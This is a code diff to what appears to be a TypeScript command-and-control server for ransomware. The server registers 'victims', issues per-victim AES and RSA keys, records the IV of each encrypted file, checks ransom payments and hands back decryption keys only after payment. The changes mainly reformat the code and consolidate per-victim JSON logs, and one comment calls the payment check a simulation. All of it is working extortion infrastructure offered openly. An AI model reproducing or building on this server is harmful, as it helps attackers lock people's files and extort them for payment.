@@ -6,12 +6,12 @@ import crypto from 'crypto'
 import fs from 'fs'
 import path from 'path'
 import { generateRSAKeys, encryptRSA, decryptRSA } from './rsaComm'
-import { 
-    MessageType, 
-    ServerMessage, 
-    VictimInfo, 
-    SERVER_CONFIG, 
-    PaymentStatus 
+import {
+    MessageType,
+    ServerMessage,
+    VictimInfo,
+    SERVER_CONFIG,
+    PaymentStatus
 } from './types/communication'
 
 // In-memory storage of victim information
@@ -101,7 +101,8 @@ server.on('connection', (socket) => {
                         response = handlePaymentVerification(
                             message.victimId,
                             message.message // transaction ID
-                        )                    }
+                        )
+                    }
                     break
 
                 case MessageType.DECRYPT_REQUEST:
@@ -116,10 +117,15 @@ server.on('connection', (socket) => {
                     break
 
                 case MessageType.STORE_ENCRYPTION_RESULTS:
-                    if (!currentVictimId || !message.encryptionResults || !message.targetDirectory) {
+                    if (
+                        !currentVictimId ||
+                        !message.encryptionResults ||
+                        !message.targetDirectory
+                    ) {
                         response = {
                             type: 'ERROR',
-                            message: 'Missing victim ID, encryption results, or target directory'
+                            message:
+                                'Missing victim ID, encryption results, or target directory'
                         }
                     } else {
                         response = handleStoreEncryptionResults(
@@ -213,9 +219,7 @@ function handleInitialize(ipAddress: string): ServerMessage {
     const aesKey = crypto.randomBytes(32)
 
     // Generate RSA key pair for secure communication
-    const { publicKey, privateKey } = generateRSAKeys()
-
-    // Store victim information
+    const { publicKey, privateKey } = generateRSAKeys() // Store victim information
     victims.set(victimId, {
         victimId,
         aesKey,
@@ -231,8 +235,14 @@ function handleInitialize(ipAddress: string): ServerMessage {
     console.log(`[+] Initialized new victim: ${victimId}`)
     logVictimStatus()
 
-    // Save victim data immediately
-    saveVictimData(victimId)
+    // Save victim initialization entry
+    saveVictimResults(victimId, {
+        action: 'INITIALIZE',
+        timestamp: new Date().toISOString(),
+        ipAddress,
+        aesKeyLength: aesKey.length,
+        publicKeyLength: publicKey.length
+    })
 
     // Return the victim ID and public key to the client
     return {
@@ -256,12 +266,18 @@ function handleStoreIV(
             type: 'ERROR',
             message: 'Victim ID not found'
         }
-    }
-
-    // Store the IV for this file
+    } // Store the IV for this file
     victim.ivMap.set(filePath, iv)
 
     console.log(`[+] Stored IV for file: ${filePath} (Victim: ${victimId})`)
+
+    // Save IV storage entry
+    saveVictimResults(victimId, {
+        action: 'STORE_IV',
+        timestamp: new Date().toISOString(),
+        filePath,
+        totalFiles: victim.ivMap.size
+    })
 
     return {
         type: 'STORE_IV_RESPONSE',
@@ -286,6 +302,13 @@ function handleEncryptKey(victimId: string): ServerMessage {
 
     console.log(`[+] Encrypted AES key for victim: ${victimId}`)
 
+    // Save key encryption entry
+    saveVictimResults(victimId, {
+        action: 'ENCRYPT_KEY',
+        timestamp: new Date().toISOString(),
+        success: true
+    })
+
     return {
         type: 'ENCRYPT_KEY_RESPONSE',
         encryptedAESKey: encryptedAESKey.toString('base64'),
@@ -305,9 +328,7 @@ function handlePaymentVerification(
             type: 'ERROR',
             message: 'Victim ID not found'
         }
-    }
-
-    // Simulate payment verification (in a real scenario, this would check blockchain)
+    } // Simulate payment verification (in a real scenario, this would check blockchain)
     // For this simulation, we assume any transaction ID is valid
     const isPaymentValid = transactionId.length > 8
     if (isPaymentValid) {
@@ -316,8 +337,13 @@ function handlePaymentVerification(
             `[+] Payment verified for victim: ${victimId} (Transaction: ${transactionId})`
         )
 
-        // Save updated victim data with payment status
-        saveVictimData(victimId)
+        // Save payment verification entry
+        saveVictimResults(victimId, {
+            action: 'PAYMENT_VERIFICATION',
+            timestamp: new Date().toISOString(),
+            transactionId,
+            paymentStatus: 'paid'
+        })
     } else {
         console.log(
             `[-] Invalid payment for victim: ${victimId} (Transaction: ${transactionId})`
@@ -348,17 +374,21 @@ function handleDecryptRequest(victimId: string): ServerMessage {
             success: false,
             message: 'Payment has not been verified'
         }
-    }
-
-    // Prepare IVs to send back to the client
+    } // Prepare IVs to send back to the client
     const ivMapObject: Record<string, string> = {}
     victim.ivMap.forEach((iv, filePath) => {
         ivMapObject[filePath] = iv.toString('base64')
     })
+
     console.log(`[+] Sending decryption keys for victim: ${victimId}`)
 
-    // Save updated victim data with decryption status
-    saveVictimData(victimId)
+    // Save decryption request entry
+    saveVictimResults(victimId, {
+        action: 'DECRYPTION_REQUEST',
+        timestamp: new Date().toISOString(),
+        success: true,
+        filesCount: victim.ivMap.size
+    })
 
     // Send the private key and IVs back to the client
     return {
@@ -385,31 +415,36 @@ function handleStoreEncryptionResults(
 
     try {
         // Decode the encryption results
-        const encryptionResultsBuffer = Buffer.from(encryptionResultsBase64, 'base64')
+        const encryptionResultsBuffer = Buffer.from(
+            encryptionResultsBase64,
+            'base64'
+        )
         const encryptionResults = JSON.parse(encryptionResultsBuffer.toString())
-        
+
         // Store in victim data
         victim.encryptionResults = encryptionResults
         victim.targetDirectory = targetDirectory
-        
-        // Save to results directory with victim ID
-        const resultsFilePath = path.join(SERVER_CONFIG.RESULTS_DIR, `${victimId}_encryption_results.json`)
-        fs.writeFileSync(resultsFilePath, JSON.stringify({
-            victimId,
+
+        // Save to single file per victim with timestamp as entry
+        saveVictimResults(victimId, {
+            action: 'ENCRYPTION',
+            timestamp: new Date().toISOString(),
             targetDirectory,
-            encryptionResults,
-            timestamp: new Date().toISOString()
-        }, null, 2))
-        
-        console.log(`[+] Stored encryption results for victim ${victimId} in ${resultsFilePath}`)
-        
+            encryptionResults
+        })
+
+        console.log(`[+] Stored encryption results for victim ${victimId}`)
+
         return {
             type: 'SUCCESS',
             success: true,
             message: 'Encryption results stored successfully'
         }
     } catch (error) {
-        console.error(`[-] Failed to store encryption results for victim ${victimId}:`, error)
+        console.error(
+            `[-] Failed to store encryption results for victim ${victimId}:`,
+            error
+        )
         return {
             type: 'ERROR',
             message: 'Failed to store encryption results'
@@ -430,38 +465,61 @@ function handleLoadEncryptionResults(victimId: string): ServerMessage {
     try {
         // Try to load from memory first
         if (victim.encryptionResults) {
-            console.log(`[+] Loading encryption results from memory for victim ${victimId}`)
+            console.log(
+                `[+] Loading encryption results from memory for victim ${victimId}`
+            )
             return {
                 type: 'SUCCESS',
                 success: true,
-                encryptionResults: Buffer.from(JSON.stringify(victim.encryptionResults)).toString('base64')
+                encryptionResults: Buffer.from(
+                    JSON.stringify(victim.encryptionResults)
+                ).toString('base64')
             }
         }
-        
-        // Load from file if not in memory
-        const resultsFilePath = path.join(SERVER_CONFIG.RESULTS_DIR, `${victimId}_encryption_results.json`)
+
+        // Load from single victim file
+        const resultsFilePath = path.join(
+            SERVER_CONFIG.RESULTS_DIR,
+            `${victimId}.json`
+        )
         if (fs.existsSync(resultsFilePath)) {
             const fileContent = fs.readFileSync(resultsFilePath, 'utf8')
-            const data = JSON.parse(fileContent)
-            
-            // Update victim data
-            victim.encryptionResults = data.encryptionResults
-            victim.targetDirectory = data.targetDirectory
-            
-            console.log(`[+] Loaded encryption results from file for victim ${victimId}`)
-            return {
-                type: 'SUCCESS',
-                success: true,
-                encryptionResults: Buffer.from(JSON.stringify(data.encryptionResults)).toString('base64')
+            const victimData = JSON.parse(fileContent)
+
+            // Find the latest encryption results
+            const encryptionEntries = victimData.entries.filter(
+                (entry: any) => entry.action === 'ENCRYPTION'
+            )
+            if (encryptionEntries.length > 0) {
+                const latestEntry =
+                    encryptionEntries[encryptionEntries.length - 1]
+
+                // Update victim data
+                victim.encryptionResults = latestEntry.encryptionResults
+                victim.targetDirectory = latestEntry.targetDirectory
+
+                console.log(
+                    `[+] Loaded encryption results from file for victim ${victimId}`
+                )
+                return {
+                    type: 'SUCCESS',
+                    success: true,
+                    encryptionResults: Buffer.from(
+                        JSON.stringify(latestEntry.encryptionResults)
+                    ).toString('base64')
+                }
             }
         }
-        
+
         return {
             type: 'ERROR',
             message: 'No encryption results found for this victim'
         }
     } catch (error) {
-        console.error(`[-] Failed to load encryption results for victim ${victimId}:`, error)
+        console.error(
+            `[-] Failed to load encryption results for victim ${victimId}:`,
+            error
+        )
         return {
             type: 'ERROR',
             message: 'Failed to load encryption results'
@@ -487,17 +545,56 @@ function logVictimStatus(): void {
     console.log('\n')
 }
 
-// Save victim data to a file with victim ID in the filename
+// Save victim data entry to a single file per victim with timestamps as entries
+function saveVictimResults(victimId: string, entry: any): void {
+    const victim = victims.get(victimId)
+    if (!victim) return
+
+    try {
+        const resultsFilePath = path.join(
+            SERVER_CONFIG.RESULTS_DIR,
+            `${victimId}.json`
+        )
+
+        let victimData: any = {
+            victimId,
+            ipAddress: victim.ipAddress,
+            infected: victim.infected.toISOString(),
+            entries: []
+        }
+
+        // Load existing data if file exists
+        if (fs.existsSync(resultsFilePath)) {
+            const existingContent = fs.readFileSync(resultsFilePath, 'utf8')
+            victimData = JSON.parse(existingContent)
+        }
+
+        // Add new entry with timestamp
+        victimData.entries.push(entry)
+
+        // Update metadata
+        victimData.lastUpdated = new Date().toISOString()
+        victimData.paymentStatus = victim.paymentStatus
+        victimData.encryptedFilesCount = victim.ivMap.size
+
+        // Write updated data to file
+        fs.writeFileSync(resultsFilePath, JSON.stringify(victimData, null, 2))
+        console.log(`[+] Saved victim entry to: ${resultsFilePath}`)
+    } catch (error) {
+        console.error(`[-] Failed to save victim results: ${error}`)
+    }
+}
+
+// Save victim data to a single file per victim (updated approach)
 function saveVictimData(victimId: string): void {
     const victim = victims.get(victimId)
     if (!victim) return
 
     try {
-        // Convert the victim data to a serializable object
-        const serializableVictim = {
-            victimId: victim.victimId,
-            infected: victim.infected.toISOString(),
-            ipAddress: victim.ipAddress,
+        // Convert the victim data to a serializable entry
+        const victimEntry = {
+            action: 'VICTIM_UPDATE',
+            timestamp: new Date().toISOString(),
             paymentStatus: victim.paymentStatus,
             encryptedFilesCount: victim.ivMap.size,
             // Convert Map to object for JSON serialization
@@ -515,28 +612,20 @@ function saveVictimData(victimId: string): void {
             privateKey: victim.privateKey
         }
 
-        // Create filename with victim ID and timestamp
-        const timestamp = new Date()
-            .toISOString()
-            .replace(/:/g, '-')
-            .replace(/\./g, '-')
-        const filename = `victim_${victimId}_${timestamp}.json`
-        const filePath = path.join(RESULTS_DIR, filename)
-
-        // Write to file
-        fs.writeFileSync(filePath, JSON.stringify(serializableVictim, null, 2))
-        console.log(`[+] Saved victim data to: ${filePath}`)
+        // Use the unified saving approach
+        saveVictimResults(victimId, victimEntry)
     } catch (error) {
         console.error(`[-] Failed to save victim data: ${error}`)
     }
 }
 
 // Ensure results directory exists
-const RESULTS_DIR = path.join(__dirname, '../results')
-if (!fs.existsSync(RESULTS_DIR)) {
+if (!fs.existsSync(SERVER_CONFIG.RESULTS_DIR)) {
     try {
-        fs.mkdirSync(RESULTS_DIR, { recursive: true })
-        console.log(`[+] Created results directory: ${RESULTS_DIR}`)
+        fs.mkdirSync(SERVER_CONFIG.RESULTS_DIR, { recursive: true })
+        console.log(
+            `[+] Created results directory: ${SERVER_CONFIG.RESULTS_DIR}`
+        )
     } catch (error) {
         console.error(`[-] Failed to create results directory: ${error}`)
     }
@@ -544,7 +633,9 @@ if (!fs.existsSync(RESULTS_DIR)) {
 
 // Start the server
 server.listen(SERVER_CONFIG.PORT, SERVER_CONFIG.HOST, () => {
-    console.log(`[+] C2 Server running on ${SERVER_CONFIG.HOST}:${SERVER_CONFIG.PORT}`)
+    console.log(
+        `[+] C2 Server running on ${SERVER_CONFIG.HOST}:${SERVER_CONFIG.PORT}`
+    )
     console.log('[+] Waiting for victim connections...')
 })
 
